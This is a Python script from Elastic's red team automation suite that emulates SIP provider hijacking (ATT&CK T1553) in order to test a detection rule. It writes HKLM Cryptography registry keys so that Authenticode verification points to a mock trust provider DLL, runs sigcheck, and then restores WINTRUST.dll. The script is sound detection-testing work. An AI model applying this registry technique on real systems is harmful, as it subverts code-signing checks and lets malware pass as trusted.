# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: SIP Provider Modification
# RTA: sip_provider.py
# ATT&CK: TBD
# Description: Registers a mock SIP provider to bypass code integrity checks and execute mock malware.

import logging
import typing

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


CRYPTO_ROOT = "SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0"
VERIFY_DLL_KEY = "%s\\CryptSIPDllVerifyIndirectData\\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" % CRYPTO_ROOT
GETSIG_KEY = "%s\\CryptSIPDllGetSignedDataMsg\\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" % CRYPTO_ROOT

SIGCHECK_32_EXE = "bin/sigcheck32.exe"
SIGCHECK_64_EXE = "bin/sigcheck64.exe"
TRUST_PROVIDER_32_DLL = "bin/TrustProvider32.dll"
TRUST_PROVIDER_64_DLL = "bin/TrustProvider64.dll"

TARGET_APP_EXE = "bin/myapp.exe"


@typing.no_type_check
def register_sip_provider(dll_path: str, verify_function: str, getsig_function: str):
    winreg = _common.get_winreg()
    hkey = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, VERIFY_DLL_KEY)

    log.info("Setting verify dll path: %s" % dll_path)
    winreg.SetValueEx(hkey, "Dll", 0, winreg.REG_SZ, dll_path)

    log.info("Setting verify function name: %s" % verify_function)
    winreg.SetValueEx(hkey, "FuncName", 0, winreg.REG_SZ, verify_function)

    hkey = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, GETSIG_KEY)

    log.info("Setting getsig dll path: %s" % dll_path)
    winreg.SetValueEx(hkey, "Dll", 0, winreg.REG_SZ, dll_path)

    log.info("Setting getsig function name: %s" % getsig_function)
    winreg.SetValueEx(hkey, "FuncName", 0, winreg.REG_SZ, getsig_function)


@register_code_rta(
    id="b0e3e1bb-dfa5-473a-8862-b2d1d42819ce",
    name="sip_provider",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[],
    siem_rules=[RuleMetadata(id="f2c7b914-eda3-40c2-96ac-d23ef91776ca", name="SIP Provider Modification")],
    techniques=["T1553"],
    ancillary_files=[SIGCHECK_32_EXE, SIGCHECK_64_EXE, TRUST_PROVIDER_32_DLL, TRUST_PROVIDER_64_DLL, TARGET_APP_EXE],
)
def main():
    if _common.is_64bit():
        sigcheck_exe = SIGCHECK_64_EXE
        trust_provider_dll = TRUST_PROVIDER_64_DLL
    else:
        sigcheck_exe = SIGCHECK_32_EXE
        trust_provider_dll = TRUST_PROVIDER_32_DLL

    log.info("Registering SIP provider")
    register_sip_provider(trust_provider_dll, "VerifyFunction", "GetSignature")

    log.info("Launching sigcheck")
    _ = _common.execute_command([sigcheck_exe, "-accepteula", TARGET_APP_EXE])

    log.info("Cleaning up")
    wintrust = "C:\\Windows\\System32\\WINTRUST.dll"
    register_sip_provider(wintrust, "CryptSIPVerifyIndirectData", "CryptSIPGetSignedDataMsg")
